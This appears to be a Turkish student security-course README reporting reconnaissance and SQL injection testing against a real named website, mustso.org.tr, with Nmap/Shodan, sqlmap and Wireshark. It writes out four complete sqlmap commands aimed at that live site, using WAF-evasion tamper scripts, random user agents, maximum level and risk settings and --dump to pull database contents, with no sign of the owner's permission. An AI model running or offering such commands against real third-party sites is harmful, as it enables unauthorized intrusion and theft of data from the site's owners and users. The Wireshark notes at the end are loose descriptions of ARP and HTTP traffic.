# Bilgi Sistemleri ve Güvenliği

Testler Sqlmap, Nikto, Nmap üzerinden yapılmıştır.

# Nmap

https://www.shodan.io/
sitesinde yapılan taramada orta seviyeli olarak CVE-2014-4078 sonucu elde edildi ve ISS 8.5 kullanıldığı tespit edildi.

# Sqlmap

Sqlmapte yapılan testler sonucunda veritabanı olarak PostgreSQL kullanıldığı tespit edildi. Bunun yanı sıra yapılan testler sonucunda belirli çıktılar elde edildi.
WAF ile korunduğu için bazı sql injectionlar denenemedi bunlar txtler içinde gözükmektedir.

## Bu test aşamasında yazılan kodlar:

### 1-) python sqlmap.py -u "https://www.mustso.org.tr/Bas%C4%B1ndaBiz/Haber/tabid/17222/articleType/ArticleView/articleId/41518/Hayirli-Ramazanlar.aspx" --data="*"  --tamper="space2comment" --dbs --dump --batch

### 2-) python sqlmap.py -u "https://www.mustso.org.tr/Bas%C4%B1ndaBiz/Haber/tabid/17222/articleType/ArticleView/articleId/41518/Hayirli-Ramazanlar.aspx" --data="*"  --tamper="space2comment" --dbs --level 5 --risk 3 --dump --batch

### 3-)python sqlmap.py -u "https://www.mustso.org.tr/Default.aspx" --dbs --forms --crawl=2 --tamper=space2comment --random-agent
#### Bu işlemde veritabanının PostgreSQL olduğu tespit edilmiştir!


### 4-) python sqlmap.py -u "https://www.mustso.org.tr/Default.aspx" --dbs --forms --crawl=2 --dbms=postgresql --tamper=space2comment --random-agent --time-sec=10 --level=5 --risk=3
#### Bu test yüksek fazda olmuştur ve 11 saate yakın bir süreçte tamamlanmıştır.

<br>

# Testler (Wireshark) üzerinden yapılmıştır.

## 1. Bad TCP
tcp.analysis.flags && !tcp.analysis.window_update && !tcp.analysis.keep_alive && !tcp.analysis.keep_alive_ack <br>
Bad TCP 54 tane taradımız ağ’da bulduk, bunları göremek için github linkin’den ulaşabilirsiniz


## 2. ARP (Address Resulation Protocol)
Tipik bir kullanım, bir IP adresinin (ör. 192.168.0.10) temel Ethernet adresine (ör. 01:02:03:04:05:06) eşlenmesidir. ARP bu adreslerin keşfedilme şekli olduğundan, genellikle bir konuşmanın başında ARP paketlerini görürsünüz.
<br>Aşağıda 9 tane (ARP) paketini mustso’dan yakaladık. ARP bizim için önemli bir bilgidir.


## 3. HTTP (Hypertext Transfer Protocol)
Çok fazla içerik türü(content types) En kiritik buldumuz kısımda Application buldundu kısımdır.
Kötü amaçlı ve yazılım ararken kullandığınız etiket içerik türü ve uygulama türüdür.
